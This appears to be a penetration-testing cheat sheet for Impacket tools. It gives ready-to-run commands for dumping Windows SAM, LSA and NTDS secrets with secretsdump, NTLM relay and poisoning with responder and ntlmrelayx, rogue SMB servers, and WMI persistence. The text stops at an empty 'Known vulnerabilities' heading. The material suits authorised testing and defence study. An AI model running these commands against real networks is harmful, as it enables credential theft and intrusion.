### General

```
# Almost every Impacket scripts follows the same option syntax

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it

```

### Windows Secrets

```
# Performs various techniques to dump secrets from the remote machine without 
# executing any agent there. 

# For SAM and LSA Secrets (including cached creds) 
# we try to read as much as we can from the registry and then we save the hives 
# in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data 
# from there. 

# For DIT files, we dump NTLM hashes, Plaintext credentials (if available)
# and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit 
# via vssadmin executed with the smbexec/wmiexec approach. The script initiates the 
# services required for its working if they are not available (e.g. 
# Remote Registry, even if it is disabled). 

# After the work is done, things are restored to the original state.

# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Remote extraction
secretsdump.py -just-dc-ntlm domain/user:password@IP
secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH

```

### Server Tools / MiTM Attacks

```
# This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying
# credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.)
# By default, it dumps the SAM database
responder.py -I eth0 -r -d -w
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c "ipconfig"


# A SMB Server that answers specific file contents regardless of the SMB share and pathname specified
karmaSMB.py filenamePathname
karmaSMB.py filenamePathname -smb2support

# A Python implementation of an SMB server. Allows to quickly set up shares and user accounts
smbserver.py SHARENAME /path/to/your/local/share
smbserver.py SHARENAME /path/to/your/local/share --username user --password password

```

### WMI

```
# It allows to issue WQL queries and get description of WMI objects at 
# the target system (e.g. select name from win32_account).
wmiquery.py domain/user:password@IP
# It will open a shell where you can execute WQL queries
SELECT * FROM Win32_LogicalDisk WHERE FreeSpace < 209152

# This script creates/removes a WMI Event Consumer/Filter and link between
# both to execute Visual Basic based on the WQL filter or timer specified.
wmipersist.py domain/user:password@IP install
wmipersist.py domain/user:password@IP remove

```

### Known vulnerabilities
